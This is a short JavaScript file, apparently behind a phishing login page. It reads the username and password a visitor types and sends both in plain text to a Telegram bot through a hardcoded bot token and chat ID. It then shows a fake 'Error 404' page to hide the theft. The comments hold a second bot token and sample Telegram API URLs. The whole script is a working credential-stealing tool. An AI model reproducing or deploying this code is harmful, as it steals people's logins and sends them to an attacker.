const token = '5430648157:AAGbdd25X0UqIJ2CO49KrPBCAq679yAvWU4';

// https://api.telegram.org/bot5430648157:AAGbdd25X0UqIJ2CO49KrPBCAq679yAvWU4/getUpdates
// https://api.telegram.org/bot6299619817:AAHswZJFCdu2i2VTNPiw-b-hu-fQdLjKB00/sendMessage?chat_id=932189267&text=hi

const btn = document.querySelector('#formBtn');
const main = document.querySelector('main');
const foot = document.querySelector('footer');
const errBlock = document.querySelector('#errBlock');

btn.addEventListener('click', () => {
    let pass = document.querySelector('#formPass');
    let name = document.querySelector('#formName');
    if (pass.value === "" || name.value === "") {
        alert('Заполните поля');
    } else {
        let message = `Name: ${name.value}; Password: ${pass.value}`;
        let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=932189267&text=${message}`;
        let xhttp = new XMLHttpRequest();
        xhttp.open('GET', url, true);
        xhttp.send();

        pass.value = '';
        name.value = '';
        main.innerHTML = `<div class="err-block" id="errBlock">
        <p class="err-text r-reg">Error 404</p></div>`;
        foot.innerHTML = '';
    }
})